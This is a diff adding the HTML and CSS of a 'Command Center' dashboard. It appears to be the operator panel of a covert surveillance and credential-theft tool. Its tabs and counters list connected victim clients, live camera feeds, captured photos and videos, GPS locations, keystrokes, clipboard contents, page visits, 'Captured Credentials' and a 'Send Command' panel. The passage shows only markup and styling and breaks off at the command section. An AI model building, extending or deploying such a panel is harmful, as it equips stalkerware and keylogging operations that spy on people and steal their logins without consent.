@@ -1,0 +1,2078 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Command Center</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#f0f2f5;
+  --panel:#ffffff;
+  --panel2:#f8f9fa;
+  --border:#dadce0;
+  --border2:#bdc1c6;
+  --accent:#1a73e8;
+  --accent2:#1557b0;
+  --text:#202124;
+  --text2:#5f6368;
+  --dim:#80868b;
+  --green:#0f9d58;
+  --online:#0f9d58;
+  --danger:#d93025;
+  --radius:8px
+}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;font-size:14px}
+
+/* HEADER */
+.hdr{position:sticky;top:0;z-index:200;background:var(--panel);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.hdr h1{font-size:.85rem;color:var(--accent);letter-spacing:4px;font-weight:700;white-space:nowrap;text-transform:uppercase}
+.hdr .conn{display:flex;align-items:center;gap:6px;font-size:.68rem;color:var(--dim)}
+.hdr .dot{width:7px;height:7px;border-radius:50%;background:var(--dim)}
+.hdr .dot.on{background:var(--online);box-shadow:0 0 6px rgba(15,157,88,.4);animation:pulse 2s infinite}
+.hdr .dot.off{background:var(--danger)}
+.hdr .spacer{flex:1}
+.hdr .clock{font-family:'Consolas',monospace;font-size:.68rem;color:var(--dim)}
+.hdr .btn{padding:5px 12px;border-radius:5px;border:1px solid var(--border2);background:transparent;color:var(--text2);font-size:.65rem;cursor:pointer;transition:all .15s;white-space:nowrap;font-family:inherit}
+.hdr .btn:hover{background:var(--panel2);border-color:var(--text2);color:var(--accent)}
+.hdr .btn.danger{border-color:#f5c6c4}.hdr .btn.danger:hover{background:#fce8e6;border-color:var(--danger);color:var(--danger)}
+.hdr .btn.export{border-color:#c8e6c9}.hdr .btn.export:hover{background:#e8f5e9;border-color:#0f9d58;color:#0f9d58}
+
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}
+
+/* STATS */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(90px,1fr));gap:1px;background:var(--border);border-bottom:1px solid var(--border)}
+.stat{background:var(--panel);padding:12px 8px;text-align:center;transition:background .15s;cursor:default}
+.stat:hover{background:var(--panel2)}
+.stat .n{font-size:1.5rem;font-weight:700;color:var(--accent);font-family:'Consolas',monospace;line-height:1;letter-spacing:-0.5px}
+.stat .l{font-size:.52rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--dim);margin-top:4px}
+
+/* FILTER + TABS ROW */
+.toolbar{display:flex;align-items:stretch;gap:0;background:var(--panel);border-bottom:1px solid var(--border)}
+.filter-wrap{padding:0 14px 0 0;border-right:1px solid var(--border);display:flex;align-items:center;gap:8px;margin:8px 14px 8px 14px;flex-shrink:0}
+.filter-wrap label{font-size:.6rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;white-space:nowrap}
+.filter-wrap select{background:#fff;border:1px solid var(--border2);color:var(--text);padding:4px 8px;border-radius:4px;font-size:.68rem;font-family:inherit;outline:none}
+.filter-wrap select:focus{border-color:var(--text2)}
+.tabs{display:flex;gap:0;overflow-x:auto;flex:1}
+.tabs::-webkit-scrollbar{height:0}
+.tab{padding:11px 14px;font-size:.62rem;text-transform:uppercase;letter-spacing:1px;color:var(--dim);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;white-space:nowrap;user-select:none}
+.tab:hover{color:var(--text2);background:rgba(0,0,0,.04)}
+.tab.active{color:var(--accent);border-bottom-color:var(--accent);background:rgba(26,115,232,.06)}
+
+/* VIEWS */
+.view{display:none;padding:16px 20px}.view.active{display:block}
+
+/* GRID */
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.grid3{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px}
+@media(max-width:768px){.grid2{grid-template-columns:1fr}}
+
+/* PANEL */
+.pnl{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;display:flex;flex-direction:column}
+.pnl.full{grid-column:1/-1}
+.pnl-h{padding:10px 14px;background:var(--panel2);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
+.pnl-h h2{font-size:.62rem;text-transform:uppercase;letter-spacing:2px;color:var(--text2);font-weight:600}
+.pnl-h .badge{background:var(--panel);border:1px solid var(--border2);color:var(--text);font-size:.52rem;padding:1px 6px;border-radius:8px;font-weight:700}
+.pnl-b{padding:12px;overflow-y:auto;max-height:500px;flex:1}
+.pnl-b.np{padding:0}
+
+/* CLIENT CARDS */
+.cl{display:flex;gap:10px;padding:10px 14px;border-bottom:1px solid var(--border);transition:background .1s;cursor:default}
+.cl:hover{background:var(--panel2)}
+.cl:last-child{border-bottom:none}
+.cl .dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;margin-top:5px}
+.cl .dot.on{background:var(--online)}
+.cl .dot.off{background:var(--dim)}
+.cl .inf{flex:1;min-width:0}
+.cl .cid{font-family:'Consolas',monospace;font-size:.76rem;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:600}
+.cl .meta{font-size:.6rem;color:var(--dim);margin-top:3px;line-height:1.6}
+.cl .loc{font-size:.65rem;color:var(--text2);font-family:'Consolas',monospace;margin-top:3px}
+.cl .loc a{color:var(--text2);text-decoration:none;margin-left:6px;font-size:.58rem;opacity:.7}
+.cl .loc a:hover{opacity:1}
+.cl .geo{font-size:.6rem;color:var(--text2);margin-top:2px;opacity:.8}
+.cl .dev{font-size:.56rem;color:var(--dim);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.cl .photo-thumb{width:46px;height:46px;border-radius:5px;object-fit:cover;border:1px solid var(--border);flex-shrink:0;opacity:.85}
+.cl .del-btn{background:none;border:none;color:var(--dim);font-size:.62rem;cursor:pointer;align-self:flex-start;padding:2px 5px;transition:color .15s}
+.cl .del-btn:hover{color:var(--danger)}
+
+/* PHOTO GALLERY */
+.pgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:6px}
+.pcard{background:var(--panel2);border:1px solid var(--border);border-radius:6px;overflow:hidden;cursor:pointer;transition:border-color .15s,transform .15s}
+.pcard:hover{border-color:var(--border2);transform:scale(1.02)}
+.pcard img{width:100%;aspect-ratio:4/3;object-fit:cover;display:block}
+.pcard .pi{padding:5px 7px;font-size:.56rem;color:var(--dim)}
+.pcard .pi strong{display:block;color:var(--text2);font-family:'Consolas',monospace;font-size:.58rem}
+
+/* VIDEO GALLERY */
+.vcard{background:var(--panel2);border:1px solid var(--border);border-radius:6px;overflow:hidden;transition:border-color .15s}
+.vcard:hover{border-color:var(--border2)}
+.vcard video,.vcard audio{width:100%;display:block}
+.vcard .vi{padding:6px 8px;font-size:.56rem;color:var(--dim)}
+.vcard .vi strong{display:block;color:var(--text2);font-family:'Consolas',monospace}
+
+/* EVENT LOG */
+.ev{display:flex;gap:8px;padding:5px 14px;border-bottom:1px solid var(--border);font-size:.7rem;align-items:flex-start}
+.ev:last-child{border-bottom:none}
+.ev:hover{background:rgba(0,0,0,.02)}
+.ev .t{color:var(--dim);font-family:'Consolas',monospace;font-size:.58rem;white-space:nowrap;min-width:55px;padding-top:1px}
+.ev .tp{font-weight:700;font-size:.52rem;padding:2px 6px;border-radius:3px;text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;border:1px solid}
+.ev .tp.location{background:#e6f4ea;color:#0f9d58;border-color:#a8d5b5}
+.ev .tp.media{background:#e8eaf6;color:#3949ab;border-color:#9fa8da}
+.ev .tp.photo{background:#e3f2fd;color:#1565c0;border-color:#90caf9}
+.ev .tp.error{background:#fce8e6;color:#c5221f;border-color:#f5c6c4}
+.ev .tp.client_connected{background:#e6f4ea;color:#137333;border-color:#a8d5b5}
+.ev .tp.client_disconnected{background:#fce8e6;color:#c5221f;border-color:#f5c6c4}
+.ev .tp.device_info{background:#f1f3f4;color:#5f6368;border-color:#dadce0}
+.ev .tp.keystrokes{background:#fff8e1;color:#e65100;border-color:#ffcc80}
+.ev .tp.clipboard{background:#f3e5f5;color:#6a1b9a;border-color:#ce93d8}
+.ev .tp.page_visit{background:#e3f2fd;color:#1565c0;border-color:#90caf9}
+.ev .tp.command{background:#f1f3f4;color:#3c4043;border-color:#dadce0}
+.ev .d{color:var(--text2);flex:1;word-break:break-word;font-size:.68rem}
+
+/* MAP */
+#map{height:450px;border-radius:var(--radius);border:1px solid var(--border)}
+
+/* CAMERA FEED */
+.cam-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px}
+.cam-card{background:var(--panel2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
+.cam-card .cam-hdr{padding:8px 12px;background:var(--panel);display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border)}
+.cam-card .cam-hdr .cam-id{font-family:'Consolas',monospace;font-size:.7rem;color:var(--text);font-weight:600}
+.cam-card .cam-hdr .cam-time{font-size:.56rem;color:var(--dim);font-family:'Consolas',monospace}
+.cam-card .cam-hdr .cam-dot{width:5px;height:5px;border-radius:50%;background:var(--online);margin-right:5px;display:inline-block;animation:pulse 2s infinite}
+.cam-card img{width:100%;display:block;aspect-ratio:4/3;object-fit:cover;cursor:pointer;transition:opacity .2s}
+.cam-card img:hover{opacity:.9}
+.cam-card .cam-meta{padding:5px 12px;font-size:.56rem;color:var(--dim)}
+.cam-card .cam-controls{padding:7px 12px;display:flex;gap:6px;border-top:1px solid var(--border);background:var(--panel)}
+.cam-card .cam-controls button{padding:4px 10px;border-radius:4px;border:1px solid var(--border2);background:transparent;color:var(--text2);font-size:.6rem;cursor:pointer;transition:all .12s;font-family:inherit}
+.cam-card .cam-controls button:hover{background:var(--panel2);border-color:var(--text);color:var(--accent)}
+.cam-card .cam-controls button:disabled{opacity:.3;cursor:not-allowed}
+.cam-card .cam-controls button.active{background:#e6f4ea;border-color:var(--online);color:var(--online)}
+.cam-card .live-indicator{display:inline-flex;align-items:center;gap:4px;font-size:.56rem;color:var(--accent);font-weight:700;text-transform:uppercase;letter-spacing:1px}
+.cam-card .live-indicator .live-dot{width:5px;height:5px;border-radius:50%;background:var(--accent);animation:pulse 1s infinite}
+.cam-card .cam-fps{font-size:.52rem;color:var(--dim);font-family:'Consolas',monospace}
+
+/* KEYSTROKE LOG */
+.key-entry{padding:10px 14px;border-bottom:1px solid var(--border)}
+.key-entry:last-child{border-bottom:none}
+.key-entry:hover{background:rgba(0,0,0,.02)}
+.key-entry .key-hdr{display:flex;justify-content:space-between;margin-bottom:5px;align-items:center}
+.key-entry .key-id{font-family:'Consolas',monospace;color:var(--text2);font-size:.63rem;font-weight:600}
+.key-entry .key-time{font-family:'Consolas',monospace;color:var(--dim);font-size:.58rem}
+.key-entry .key-url{font-size:.58rem;color:var(--dim);margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;opacity:.7}
+.key-entry .key-text{font-family:'Consolas',monospace;background:#f8f9fa;padding:7px 10px;border-radius:4px;color:#202124;font-size:.7rem;word-break:break-all;line-height:1.6;border:1px solid var(--border)}
+.key-entry .key-text .special{color:var(--text2);font-size:.58rem;opacity:.7}
+
+/* CLIPBOARD */
+.clip-entry{padding:10px 14px;border-bottom:1px solid var(--border)}
+.clip-entry:last-child{border-bottom:none}
+.clip-entry:hover{background:rgba(0,0,0,.02)}
+.clip-entry .clip-hdr{display:flex;justify-content:space-between;margin-bottom:5px;align-items:center}
+.clip-entry .clip-id{font-family:'Consolas',monospace;color:var(--text2);font-size:.63rem;font-weight:600}
+.clip-entry .clip-time{font-family:'Consolas',monospace;color:var(--dim);font-size:.58rem}
+.clip-entry .clip-text{font-family:'Consolas',monospace;background:#f8f9fa;padding:7px 10px;border-radius:4px;color:#202124;font-size:.68rem;word-break:break-all;border:1px solid var(--border);max-height:120px;overflow-y:auto}
+
+/* VISITS */
+.visit-entry{display:flex;gap:10px;padding:7px 14px;border-bottom:1px solid var(--border);font-size:.7rem;align-items:center}
+.visit-entry:last-child{border-bottom:none}
+.visit-entry:hover{background:rgba(0,0,0,.02)}
+.visit-entry .v-id{font-family:'Consolas',monospace;color:var(--text2);font-size:.62rem;min-width:80px;font-weight:600}
+.visit-entry .v-url{color:var(--text);flex:1;font-family:'Consolas',monospace;font-size:.65rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.visit-entry .v-title{color:var(--dim);font-size:.58rem;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.visit-entry .v-time{color:var(--dim);font-family:'Consolas',monospace;font-size:.57rem;white-space:nowrap}
+
+/* DEVICE INFO */
+.di-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:4px}
+.di-item{background:#fff;border:1px solid var(--border);border-radius:5px;padding:7px 10px}
+.di-item .k{font-size:.52rem;text-transform:uppercase;letter-spacing:1px;color:var(--dim)}
+.di-item .v{font-size:.72rem;color:var(--text);font-family:'Consolas',monospace;margin-top:2px;word-break:break-all}
+
+/* LOCATION LIST */
+.loci{display:flex;gap:8px;padding:6px 14px;border-bottom:1px solid var(--border);font-size:.7rem;align-items:center}
+.loci:last-child{border-bottom:none}
+.loci:hover{background:rgba(0,0,0,.02)}
+.loci .coords{font-family:'Consolas',monospace;color:var(--text);font-size:.68rem}
+.loci .who{color:var(--dim);font-size:.6rem}
+.loci .src{font-size:.52rem;padding:1px 5px;border-radius:3px;background:#e6f4ea;color:#0f9d58;border:1px solid #a8d5b5;text-transform:uppercase}
+.loci .when{color:var(--dim);font-size:.56rem;font-family:'Consolas',monospace}
+.loci a{margin-left:auto;color:var(--text2);text-decoration:none;font-size:.6rem;opacity:.7}
+.loci a:hover{opacity:1}
+
+/* LIGHTBOX */
+.lightbox{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:1000;display:none;align-items:center;justify-content:center;cursor:pointer}
+.lightbox.show{display:flex}
+.lightbox img{max-width:92%;max-height:92%;border-radius:6px;box-shadow:0 0 80px rgba(0,0,0,.9)}
+
+/* TOAST */
+.toast-area{position:fixed;top:56px;right:14px;z-index:500;display:flex;flex-direction:column;gap:4px;pointer-events:none}
+.toast{background:#fff;border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:5px;padding:8px 14px;font-size:.72rem;color:var(--text);animation:slideIn .25s ease;pointer-events:auto;max-width:300px;box-shadow:0 2px 8px rgba(0,0,0,.12)}
+.toast.loc{border-left-color:var(--online)}
+.toast.error{border-left-color:var(--danger);background:#fce8e6}
+.toast.command{border-left-color:var(--accent)}
+@keyframes slideIn{from{transform:translateX(110px);opacity:0}to{transform:translateX(0);opacity:1}}
+
+/* EMPTY */
+.empty{text-align:center;padding:30px;color:var(--dim);font-size:.75rem}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-track{background:#f1f3f4}::-webkit-scrollbar-thumb{background:#bdc1c6;border-radius:4px}::-webkit-scrollbar-thumb:hover{background:#80868b}
+
+/* SEARCH */
+.search-wrap{display:flex;align-items:center;background:#fff;border:1px solid var(--border2);border-radius:5px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+.search-wrap input{background:transparent;border:none;color:var(--text);padding:5px 10px;font-size:.68rem;font-family:inherit;outline:none;width:170px}
+.search-wrap input::placeholder{color:var(--dim)}
+.search-btn{background:none;border:none;border-left:1px solid var(--border);color:var(--dim);padding:5px 8px;cursor:pointer;font-size:.7rem;transition:color .15s}
+.search-btn:hover{color:var(--text)}
+
+/* SEARCH RESULTS */
+.search-results{position:fixed;top:48px;right:190px;width:400px;max-height:70vh;background:var(--panel);border:1px solid var(--border2);border-radius:8px;box-shadow:0 4px 24px rgba(0,0,0,.15);z-index:300;overflow-y:auto;display:none}
+.search-results.show{display:block}
+.search-results .sr-header{padding:9px 14px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
+.search-results .sr-header h3{font-size:.62rem;color:var(--text2);text-transform:uppercase;letter-spacing:1.5px}
+.search-results .sr-header button{background:none;border:none;color:var(--dim);cursor:pointer;font-size:.85rem;transition:color .15s}
+.search-results .sr-header button:hover{color:var(--text)}
+.search-results .sr-group{border-bottom:1px solid var(--border)}
+.search-results .sr-group-title{padding:5px 14px;font-size:.56rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--dim);background:#f1f3f4}
+.search-results .sr-item{padding:7px 14px;border-bottom:1px solid var(--border);font-size:.68rem;cursor:pointer;transition:background .1s}
+.search-results .sr-item:hover{background:var(--panel2)}
+.search-results .sr-item:last-child{border-bottom:none}
+.search-results .sr-item .sr-highlight{color:var(--accent);font-weight:700;background:rgba(26,115,232,.1);border-radius:2px;padding:0 2px}
+.search-results .sr-item .sr-meta{font-size:.58rem;color:var(--dim);margin-top:2px}
+
+/* TAB BADGE */
+.tab-badge{background:var(--panel2);border:1px solid var(--border2);color:var(--text2);font-size:.5rem;padding:1px 5px;border-radius:8px;font-weight:700;margin-left:4px;min-width:14px;text-align:center;display:inline-block;vertical-align:top}
+
+/* TOGGLE SWITCH */
+.tgl{position:relative;display:inline-block;width:34px;height:18px;flex-shrink:0;vertical-align:middle}
+.tgl input{opacity:0;width:0;height:0;position:absolute}
+.tgl span{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:var(--border2);border-radius:18px;transition:.2s}
+.tgl span:before{position:absolute;content:'';height:12px;width:12px;left:3px;bottom:3px;background:var(--dim);border-radius:50%;transition:.2s}
+.tgl input:checked+span{background:#0f9d58}
+.tgl input:checked+span:before{transform:translateX(16px);background:#fff}
+
+/* SETTINGS */
+.settings-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px}
+@media(max-width:768px){.settings-grid{grid-template-columns:1fr}}
+.cfg-group{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:14px}
+.cfg-group h3{font-size:.62rem;text-transform:uppercase;letter-spacing:2px;color:var(--text2);margin-bottom:12px;font-weight:600}
+.cfg-row{display:flex;align-items:center;gap:10px;padding:7px 0;border-bottom:1px solid var(--border);flex-wrap:wrap}
+.cfg-row:last-child{border-bottom:none}
+.cfg-row label{font-size:.7rem;color:var(--text)}
+.cfg-row input[type="number"]{width:70px;background:#fff;border:1px solid var(--border2);color:var(--text);padding:4px 8px;border-radius:4px;font-size:.7rem;text-align:right;font-family:'Consolas',monospace;outline:none}
+.cfg-row input[type="number"]:focus{border-color:var(--text2)}
+.cfg-row input[type="range"]{width:100px;accent-color:var(--text2)}
+.cfg-row .unit{font-size:.6rem;color:var(--dim);min-width:20px}
+.cfg-actions{display:flex;gap:8px;justify-content:flex-end}
+.cfg-btn{padding:7px 18px;border-radius:5px;border:1px solid var(--border2);font-size:.68rem;cursor:pointer;font-weight:600;transition:all .12s;font-family:inherit}
+.cfg-btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+.cfg-btn.primary:hover{background:var(--accent2);border-color:var(--accent2);color:#fff}
+.cfg-btn.secondary{background:transparent;color:var(--text2);border-color:var(--border2)}
+.cfg-btn.secondary:hover{background:var(--panel2);color:var(--text)}
+
+/* COMMANDS */
+.cmd-row{display:flex;align-items:center;gap:10px;margin-bottom:10px;flex-wrap:wrap}
+.cmd-row label{font-size:.62rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;min-width:80px}
+.cmd-row select,.cmd-row input,.cmd-row textarea{background:#fff;border:1px solid var(--border2);color:var(--text);padding:6px 10px;border-radius:4px;font-size:.7rem;font-family:inherit;flex:1;min-width:0;outline:none}
+.cmd-row select:focus,.cmd-row input:focus,.cmd-row textarea:focus{border-color:var(--text2)}
+.cmd-row input{min-width:80px}
+.cmd-row textarea{min-height:60px;resize:vertical}
+.cmd-preset{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:14px}
+.cmd-preset button{padding:4px 11px;border-radius:20px;border:1px solid var(--border2);background:transparent;color:var(--text2);font-size:.6rem;cursor:pointer;transition:all .12s;font-family:inherit}
+.cmd-preset button:hover{border-color:var(--text);color:var(--accent)}
+.cmd-preset button.active{background:var(--panel2);border-color:var(--text);color:var(--accent)}
+.ev .tp.command{background:#f1f3f4;color:#3c4043;border-color:#dadce0}
+.toast.command{border-left-color:var(--text2)}
+.storage-bar{height:6px;background:var(--border);border-radius:3px;margin:8px 0;overflow:hidden}
+.storage-bar div{height:100%;border-radius:3px;background:var(--accent);transition:width .3s}
+/* tab badges */
+.tab-badge{display:inline-block;background:var(--accent);color:#fff;font-size:.55rem;font-weight:700;padding:1px 5px;border-radius:8px;margin-left:3px;vertical-align:middle;min-width:14px;text-align:center}
+.tab-badge:empty{display:none}
+/* copy btn */
+.copy-btn{background:none;border:1px solid var(--border2);color:var(--text2);font-size:.6rem;padding:1px 5px;border-radius:3px;cursor:pointer;margin-left:4px;vertical-align:middle}
+.copy-btn:hover{border-color:var(--accent);color:var(--accent)}
+/* client action bar */
+.cl-action-bar{display:flex;gap:4px;margin-top:6px;flex-wrap:wrap}
+.cl-action-btn{font-size:.6rem;padding:2px 7px;border-radius:4px;border:1px solid var(--border);background:var(--panel2);color:var(--text2);cursor:pointer;white-space:nowrap}
+.cl-action-btn:hover{border-color:var(--accent);color:var(--accent)}
+/* label badge */
+.cl-label-badge{display:inline-block;font-size:.58rem;background:#f1f3f4;border:1px solid var(--border2);border-radius:4px;padding:1px 6px;margin-right:3px;color:var(--text2)}
+/* refresh ring */
+@keyframes spin{to{transform:rotate(360deg)}}
+#refresh-ring{width:14px;height:14px;border-radius:50%;border:2px solid var(--border2);border-top-color:var(--accent);display:inline-block;vertical-align:middle;margin-left:6px;animation:spin .8s linear infinite;opacity:0;transition:opacity .3s}
+#refresh-ring.active{opacity:1}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="hdr">
+    <h1>COMMAND CENTER</h1>
+    <div class="conn"><div id="dot" class="dot"></div><span id="connTxt">Connecting...</span></div>
+    <div class="spacer"></div>
+    <span id="clock" class="clock"></span>
+    <button class="btn" onclick="window.open('/','_blank')">Preview Site</button>
+    <div class="search-wrap"><input type="text" id="globalSearch" placeholder="Search everything..." onkeyup="onGlobalSearch(event)"><button class="search-btn" onclick="doGlobalSearch()">🔍</button></div>
+    <button class="btn export" onclick="location.href='/api/export?token='+AUTH_TOKEN">Export JSON</button>
+    <span id="refresh-ring" title="Refreshing..."></span><span style="font-size:.55rem;color:var(--dim);cursor:default;user-select:none" title="Ctrl+K:search  1-9:tabs  R:refresh  Esc:close">[shortcuts]</span>
+    <button class="btn" onclick="refreshAll()">↻ Refresh</button>
+    <button class="btn danger" onclick="if(confirm('Delete ALL data?'))clearAll()">Clear All</button>
+    <button class="btn" onclick="doLogout()" title="Logout" style="border-color:#a00">🔒 Logout</button>
+</div>
+
+<!-- STATS -->
+<div class="stats">
+    <div class="stat"><div id="s-on" class="n">0</div><div class="l">Online</div></div>
+    <div class="stat"><div id="s-total" class="n">0</div><div class="l">Clients</div></div>
+    <div class="stat"><div id="s-photo" class="n">0</div><div class="l">Photos</div></div>
+    <div class="stat"><div id="s-vid" class="n">0</div><div class="l">Videos</div></div>
+    <div class="stat"><div id="s-loc" class="n">0</div><div class="l">Locations</div></div>
+    <div class="stat"><div id="s-key" class="n">0</div><div class="l">Keystrokes</div></div>
+    <div class="stat"><div id="s-clip" class="n">0</div><div class="l">Clipboard</div></div>
+    <div class="stat"><div id="s-visit" class="n">0</div><div class="l">Visits</div></div>
+    <div class="stat"><div id="s-cred" class="n" style="color:#f4b400">0</div><div class="l" style="color:#f4b400">Credentials</div></div>
+    <div class="stat"><div id="s-err" class="n">0</div><div class="l">Errors</div></div>
+</div>
+
+<!-- FILTER + TABS -->
+<div class="toolbar">
+    <div class="filter-wrap">
+        <label>Client:</label>
+        <select id="clientFilter" onchange="onFilterChange()"><option value="">All Clients</option></select>
+    </div>
+        <div class="tabs">
+        <div class="tab active" data-v="overview">Overview</div>
+        <div class="tab" data-v="cameras">Cameras</div>
+        <div class="tab" data-v="photos">Photos <span class="tab-badge" id="tb-photos"></span></div>
+        <div class="tab" data-v="videos">Videos <span class="tab-badge" id="tb-videos"></span></div>
+        <div class="tab" data-v="map">Map</div>
+        <div class="tab" data-v="keys">Keys <span class="tab-badge" id="tb-keys"></span></div>
+        <div class="tab" data-v="clipboard">Clip <span class="tab-badge" id="tb-clip"></span></div>
+        <div class="tab" data-v="visits">Visits <span class="tab-badge" id="tb-visits"></span></div>
+        <div class="tab" data-v="credentials">🔑 Creds <span class="tab-badge" id="tb-creds" style="background:#f4b400;color:#000"></span></div>
+        <div class="tab" data-v="events">Events</div>
+        <div class="tab" data-v="errors">Errors <span class="tab-badge" id="tb-errors" style="background:#d93025;color:#fff"></span></div>
+        <div class="tab" data-v="devices">Devices</div>
+        <div class="tab" data-v="commands">Commands</div>
+        <div class="tab" data-v="settings">Settings</div>
+    </div>
+    </div>
+</div>
+
+<!-- --- OVERVIEW --- -->
+<div class="view active" id="v-overview">
+    <div class="grid2">
+        <div class="pnl">
+            <div class="pnl-h">
+                <h2>Clients</h2>
+                <span class="badge" id="cl-badge">0</span>
+            </div>
+            <div class="pnl-b np" id="cl-list"><div class="empty">Loading...</div></div>
+        </div>
+        <div class="pnl">
+            <div class="pnl-h"><h2>Recent Photos</h2></div>
+            <div class="pnl-b" id="recent-photos"><div class="empty">No photos</div></div>
+        </div>
+        <div class="pnl">
+            <div class="pnl-h"><h2>Recent Locations</h2></div>
+            <div class="pnl-b np" id="loc-list"><div class="empty">No locations</div></div>
+        </div>
+        <div class="pnl">
+            <div class="pnl-h"><h2>Recent Events</h2></div>
+            <div class="pnl-b np" id="ev-list"><div class="empty">Waiting for events...</div></div>
+        </div>
+        <div class="pnl full">
+            <div class="pnl-h"><h2>Activity (last hour)</h2></div>
+            <div class="pnl-b" style="padding:12px">
+                <canvas id="activityChart" style="width:100%;height:120px;display:block"></canvas>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- --- CAMERAS --- -->
+<div class="view" id="v-cameras">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px;flex-wrap:wrap">
+        <span id="live-status" style="font-size:.7rem;color:var(--dim)">Click a client to start live feed</span>
+        <button class="btn" onclick="startAllLiveFeeds()">? All Live</button>
+        <button class="btn" onclick="stopAllLiveFeeds()">� Stop All</button>
+    </div>
+    <div id="cam-feeds"><div class="empty">Loading cameras...</div></div>
+</div>
+
+<!-- --- PHOTOS --- -->
+<div class="view" id="v-photos">
+    <div id="photo-gallery"><div class="empty">No photos</div></div>
+</div>
+
+<!-- --- VIDEOS --- -->
+<div class="view" id="v-videos">
+    <div id="video-gallery"><div class="empty">No videos</div></div>
+</div>
+
+<!-- --- MAP --- -->
+<div class="view" id="v-map">
+    <div id="map"></div>
+</div>
+
+<!-- --- KEYS --- -->
+<div class="view" id="v-keys">
+    <div class="pnl">
+        <div class="pnl-h"><h2>Keystrokes</h2></div>
+        <div class="pnl-b np" id="key-log"><div class="empty">No keystrokes captured</div></div>
+    </div>
+</div>
+
+<!-- --- CLIPBOARD --- -->
+<div class="view" id="v-clipboard">
+    <div class="pnl">
+        <div class="pnl-h"><h2>Clipboard</h2></div>
+        <div class="pnl-b np" id="clip-log"><div class="empty">No clipboard data</div></div>
+    </div>
+</div>
+
+<!-- --- VISITS --- -->
+<div class="view" id="v-visits">
+    <div class="pnl">
+        <div class="pnl-h"><h2>Page Visits</h2></div>
+        <div class="pnl-b np" id="visit-log"><div class="empty">No page visits</div></div>
+    </div>
+</div>
+
+<!-- --- CREDENTIALS --- -->
+<div class="view" id="v-credentials">
+    <div class="pnl">
+        <div class="pnl-h">
+            <h2>🔑 Captured Credentials</h2>
+            <button class="btn danger" onclick="if(confirm('Delete all credentials?'))clearCredentials()">Clear</button>
+        </div>
+        <div class="pnl-b np" id="cred-log"><div class="empty">No credentials captured yet</div></div>
+    </div>
+</div>
+
+<!-- --- EVENTS --- -->
+<div class="view" id="v-events">
+    <div class="pnl">
+        <div class="pnl-h">
+            <h2>Event Log</h2>
+            <div style="display:flex;align-items:center;gap:8px">
+                <select id="ev-type-filter" onchange="renderEvents()" style="background:var(--panel2);border:1px solid var(--border2);color:var(--text);padding:3px 8px;border-radius:4px;font-size:.65rem;font-family:inherit;outline:none">
+                    <option value="">All Types</option>
+                    <option value="location">location</option>
+                    <option value="photo">photo</option>
+                    <option value="media">media</option>
+                    <option value="keystrokes">keystrokes</option>
+                    <option value="clipboard">clipboard</option>
+                    <option value="page_visit">page_visit</option>
+                    <option value="client_connected">client_connected</option>
+                    <option value="client_disconnected">client_disconnected</option>
+                    <option value="credential_captured">credential_captured</option>
+                    <option value="error">error</option>
+                </select>
+                <button class="btn" onclick="clearEventFilter()">Clear Filter</button>
+            </div>
+        </div>
+        <div class="pnl-b np" id="ev-full"><div class="empty">Waiting for events...</div></div>
+    </div>
+</div>
+
+<!-- --- ERRORS --- -->
+<div class="view" id="v-errors">
+    <div style="display:flex;justify-content:flex-end;margin-bottom:8px">
+        <button class="btn danger" onclick="clearErrorLog()">Clear Error Log</button>
+    </div>
+    <div class="pnl">
+        <div class="pnl-h"><h2>Error Log</h2></div>
+        <div class="pnl-b np" id="error-log"><div class="empty">No errors recorded</div></div>
+    </div>
+</div>
+
+<div class="view" id="v-devices">
+    <div id="device-panels"></div>
+</div>
+
+<!-- ═══ COMMANDS ═══ -->
+<div class="view" id="v-commands">
+    <div class="grid2">
+        <div class="pnl">
+            <div class="pnl-h"><h2>⚡ Send Command</h2></div>
